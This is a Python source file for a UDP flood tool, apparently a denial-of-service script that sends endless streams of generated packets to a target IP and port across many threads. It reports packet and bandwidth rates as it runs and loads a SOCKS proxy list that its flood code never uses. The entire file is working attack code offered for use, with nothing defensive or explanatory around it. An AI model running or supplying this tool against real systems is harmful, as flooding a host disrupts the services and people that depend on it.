import os
import random
import socket
import sys
import threading
import time
import asyncio
import concurrent.futures
import socks

RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"

proxies = []
use_proxy = False
proxy_type = socks.SOCKS5
pps_counter = [0]
mbps_counter = [0]


def generate_payload(size, mode="random"):
    if mode == "null":
        return b"\x00" * size
    elif mode == "text":
        return ("A" * size).encode()
    elif mode == "ascii":
        return "".join([chr(random.randint(33, 126)) for _ in range(size)]).encode()
    else:
        return random._urandom(size)


def timestamp():
    return time.strftime("%H:%M:%S")


def get_socket_with_proxy():
    raw = random.choice(proxies)
    parts = raw.strip().split(":")
    sock = socks.socksocket()
    if len(parts) == 4:
        ip, port, username, password = parts
        sock.set_proxy(proxy_type, ip, int(port), username=username, password=password)
    else:
        ip, port = parts
        sock.set_proxy(proxy_type, ip, int(port))
    return sock


def pps_monitor():
    while True:
        time.sleep(1)
        mbps = (mbps_counter[0] * 8) / 1_000_000
        print(f"{CYAN}[{timestamp()}] PPS: {pps_counter[0]} | Mbps: {mbps:.2f}{RESET}")
        pps_counter[0] = 0
        mbps_counter[0] = 0


async def udp_flood_async(target_ip, target_port, packet_size, payload_mode):
    payload = generate_payload(packet_size, payload_mode)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    loop = asyncio.get_event_loop()
    while True:
        try:
            await loop.sock_sendto(sock, payload, (target_ip, target_port))
            pps_counter[0] += 1
            mbps_counter[0] += len(payload)
        except Exception:
            await asyncio.sleep(0.01)


def start_threads(target_ip, target_port, threads, packet_size, protocol, payload_mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = []
    for _ in range(threads):
        if protocol == "udp":
            tasks.append(udp_flood_async(target_ip, target_port, packet_size, payload_mode))
    loop.run_until_complete(asyncio.gather(*tasks))


def check_latency(ip, port):
    print(f"{CYAN}[+] Checking latency to {ip}:{port}...{RESET}")
    try:
        sock = socket.create_connection((ip, port), timeout=2)
        sock.close()
        print(f"{GREEN}[✓] Latency OK{RESET}")
    except Exception as e:
        print(f"{RED}[x] Latency check failed: {e}{RESET}")


def load_proxies():
    global use_proxy
    if os.path.exists("proxies.txt"):
        with open("proxies.txt") as f:
            for line in f:
                line = line.strip()
                if line and (":" in line):
                    proxies.append(line)
        use_proxy = len(proxies) > 0
        if use_proxy:
            print(f"{YELLOW}[!] Loaded {len(proxies)} proxies from proxies.txt{RESET}")


def main():
    global proxy_type
    if len(sys.argv) < 6:
        print(
            f"Usage: python3 {sys.argv[0]} <ip> <port> <threads> <packet_size> <protocol> [payload_mode] [--proxy-type socks4|socks5]"
        )
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    threads = int(sys.argv[3])
    packet_size = int(sys.argv[4])
    protocol = sys.argv[5].lower()
    payload_mode = (
        sys.argv[6].lower()
        if len(sys.argv) > 6 and not sys.argv[6].startswith("--")
        else "random"
    )

    if "--proxy-type" in sys.argv:
        idx = sys.argv.index("--proxy-type")
        if idx + 1 < len(sys.argv):
            ptype = sys.argv[idx + 1].lower()
            if ptype == "socks4":
                proxy_type = socks.SOCKS4
            elif ptype == "socks5":
                proxy_type = socks.SOCKS5

    load_proxies()
    threading.Thread(target=pps_monitor, daemon=True).start()

    print(f"{CYAN}[*] Target: {target_ip}:{target_port}{RESET}")
    print(f"{CYAN}[*] Threads: {threads}, Size: {packet_size}, Protocol: {protocol.upper()}, Payload: {payload_mode}{RESET}")
    if use_proxy:
        print(f"{CYAN}[*] Using proxies with type: {'SOCKS4' if proxy_type == socks.SOCKS4 else 'SOCKS5'}{RESET}")

    if protocol in ("tcp", "udp"):
        check_latency(target_ip, target_port)

    executor = concurrent.futures.ThreadPoolExecutor(max_workers=threads)
    for _ in range(threads):
        executor.submit(start_threads, target_ip, target_port, 1, packet_size, protocol, payload_mode)

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print(f"{YELLOW}[!] Exiting...{RESET}")


if __name__ == "__main__":
    main()
